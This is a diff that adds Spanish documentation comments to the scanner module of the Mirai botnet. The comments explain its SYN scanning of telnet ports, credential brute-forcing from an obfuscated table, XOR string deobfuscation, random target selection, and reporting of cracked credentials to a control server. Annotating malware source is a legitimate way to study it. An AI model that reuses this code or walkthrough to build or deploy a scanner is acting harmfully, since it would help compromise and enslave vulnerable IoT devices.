@@ -1,3 +1,15 @@
+/**
+ * @file scanner.c
+ * @brief Implementación del escáner de dispositivos vulnerables para Mirai
+ *
+ * Este archivo implementa la funcionalidad de escaneo de dispositivos en la red
+ * buscando sistemas vulnerables con servicios telnet. Realiza intentos de autenticación
+ * usando una lista predefinida de combinaciones usuario/contraseña comunes.
+ * 
+ * El escáner opera como un proceso separado y utiliza sockets raw para
+ * realizar un escaneo SYN de puertos TCP 23 y 2323 (telnet).
+ */
+
 #define _GNU_SOURCE
 
 #ifdef MIRAI_TELNET
@@ -34,8 +46,23 @@ struct scanner_connection *conn_table;
 uint16_t auth_table_max_weight = 0;
 uint32_t fake_time = 0;
 
+/**
+ * @brief Recibe datos del socket y reemplaza caracteres nulos por 'A'
+ *
+ * Esta función envuelve la llamada recv() estándar y procesa los datos recibidos
+ * reemplazando cualquier carácter nulo (0x00) por el carácter 'A'. Esto es necesario
+ * porque algunos dispositivos IoT envían datos con caracteres nulos que pueden
+ * interferir con el procesamiento de las respuestas.
+ *
+ * @param sock Descriptor del socket
+ * @param buf Buffer donde se almacenarán los datos recibidos
+ * @param len Tamaño máximo del buffer
+ * @param flags Flags para la llamada recv()
+ * @return Número de bytes recibidos o -1 si hay error
+ */
 int recv_strip_null(int sock, void *buf, int len, int flags)
 {
+    /* Realizar la recepción real de datos */
     int ret = recv(sock, buf, len, flags);
 
     if (ret > 0)
@@ -54,8 +81,23 @@ int recv_strip_null(int sock, void *buf, int len, int flags)
     return ret;
 }
 
+/**
+ * @brief Inicializa el proceso de escaneo de dispositivos
+ *
+ * Esta función realiza la inicialización del escáner:
+ * 1. Crea un proceso hijo dedicado al escaneo
+ * 2. Configura el socket raw para enviar paquetes SYN
+ * 3. Inicializa la tabla de conexiones
+ * 4. Configura los paquetes IP/TCP base para el escaneo
+ * 5. Carga la tabla de credenciales para intentos de autenticación
+ *
+ * El escáner usa un puerto fuente aleatorio > 1024 para los paquetes SYN
+ * y mantiene una tabla de conexiones activas para gestionar múltiples
+ * intentos de autenticación simultáneos.
+ */
 void scanner_init(void)
 {
+    /* Variables para configuración de sockets y paquetes */
     int i;
     uint16_t source_port;
     struct iphdr *iph;
@@ -643,8 +685,19 @@ void scanner_kill(void)
     kill(scanner_pid, 9);
 }
 
+/**
+ * @brief Configura una nueva conexión TCP para intentar autenticación
+ *
+ * Esta función auxiliar prepara una nueva conexión TCP hacia un objetivo
+ * que respondió al escaneo SYN inicial. Configura el socket en modo
+ * no bloqueante y establece los parámetros necesarios para intentar
+ * la conexión telnet.
+ *
+ * @param conn Puntero a la estructura de conexión a configurar
+ */
 static void setup_connection(struct scanner_connection *conn)
 {
+    /* Estructura para la dirección del objetivo */
     struct sockaddr_in addr = {0};
 
     if (conn->fd != -1)
@@ -671,8 +724,22 @@ static void setup_connection(struct scanner_connection *conn)
     connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
 }
 
+/**
+ * @brief Genera una dirección IPv4 aleatoria válida para escaneo
+ *
+ * Esta función genera direcciones IP aleatorias evitando rangos reservados,
+ * privados o especiales como:
+ * - Loopback (127.0.0.0/8)
+ * - Redes privadas (10.0.0.0/8, 192.168.0.0/16, 172.16.0.0/12)
+ * - Multicast (224.0.0.0/4)
+ * - Rangos del Departamento de Defensa
+ * - Otros rangos especiales o reservados
+ *
+ * @return Dirección IPv4 aleatoria en formato network byte order
+ */
 static ipv4_t get_random_ip(void)
 {
+    /* Variables para construcción de IP */
     uint32_t tmp;
     uint8_t o1, o2, o3, o4;
 
@@ -703,9 +770,25 @@ static ipv4_t get_random_ip(void)
     return INET_ADDR(o1,o2,o3,o4);
 }
 
+/**
+ * @brief Procesa los comandos IAC (Interpret As Command) del protocolo telnet
+ *
+ * Esta función maneja la negociación telnet inicial, procesando los comandos IAC
+ * recibidos del servidor y respondiendo apropiadamente. Implementa un subconjunto
+ * del protocolo telnet necesario para establecer una sesión básica.
+ *
+ * Los comandos soportados incluyen:
+ * - WILL/WONT/DO/DONT para opciones telnet
+ * - Negociación de terminal
+ *
+ * @param conn Puntero a la estructura de conexión actual
+ * @return Número de bytes consumidos del buffer
+ */
 static int consume_iacs(struct scanner_connection *conn)
 {
+    /* Contador de bytes procesados */
     int consumed = 0;
+    /* Puntero al buffer de lectura */
     uint8_t *ptr = conn->rdbuf;
 
     while (consumed < conn->rdbuf_pos)
@@ -765,6 +848,18 @@ static int consume_iacs(struct scanner_connection *conn)
     return consumed;
 }
 
+/**
+ * @brief Detecta cualquier tipo de prompt en la respuesta del servidor
+ *
+ * Busca caracteres típicos de prompts de shell como ':', '>', '$', '#', '%'
+ * que indican que el servidor está esperando entrada del usuario.
+ *
+ * Esta función es utilizada para detectar cuando el servidor está listo
+ * para recibir comandos después de una autenticación exitosa.
+ *
+ * @param conn Puntero a la estructura de conexión actual
+ * @return Posición del final del prompt o 0 si no se encuentra
+ */
 static int consume_any_prompt(struct scanner_connection *conn)
 {
     char *pch;
@@ -868,6 +963,18 @@ static int consume_resp_prompt(struct scanner_connection *conn)
         return prompt_ending;
 }
 
+/**
+ * @brief Agrega una nueva entrada a la tabla de credenciales
+ *
+ * Esta función añade un nuevo par usuario/contraseña a la tabla de credenciales
+ * que se utilizarán en los intentos de autenticación. Los datos se almacenan
+ * en formato ofuscado y se les asigna un peso para controlar la frecuencia
+ * con la que se utilizan.
+ *
+ * @param enc_user Usuario en formato ofuscado
+ * @param enc_pass Contraseña en formato ofuscado
+ * @param weight Peso de la entrada (mayor peso = más probabilidad de uso)
+ */
 static void add_auth_entry(char *enc_user, char *enc_pass, uint16_t weight)
 {
     int tmp;
@@ -898,6 +1005,20 @@ static struct scanner_auth *random_auth_entry(void)
     return NULL;
 }
 
+/**
+ * @brief Reporta un dispositivo vulnerable al servidor de control
+ *
+ * Cuando se encuentra un dispositivo con credenciales válidas, esta función
+ * crea un proceso hijo para reportar el hallazgo al servidor de control.
+ * Envía la dirección IP, puerto y credenciales del dispositivo vulnerable.
+ *
+ * El reporte se realiza en un proceso separado para no interferir con
+ * el proceso principal de escaneo.
+ *
+ * @param daddr Dirección IP del dispositivo vulnerable
+ * @param dport Puerto del servicio telnet
+ * @param auth Puntero a la estructura con las credenciales válidas
+ */
 static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *auth)
 {
     struct sockaddr_in addr;
@@ -960,6 +1081,18 @@ static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *au
     exit(0);
 }
 
+/**
+ * @brief Desofusca una cadena codificada
+ *
+ * Esta función toma una cadena ofuscada (típicamente credenciales)
+ * y la desofusca usando una serie de operaciones XOR. La secuencia
+ * de desofuscación usa las constantes:
+ * 0xDE, 0xAD, 0xBE, 0xEF
+ *
+ * @param str Cadena ofuscada a decodificar
+ * @param len Puntero donde se almacenará la longitud de la cadena
+ * @return Puntero a la cadena desofuscada (debe liberarse)
+ */
 static char *deobf(char *str, int *len)
 {
     int i;
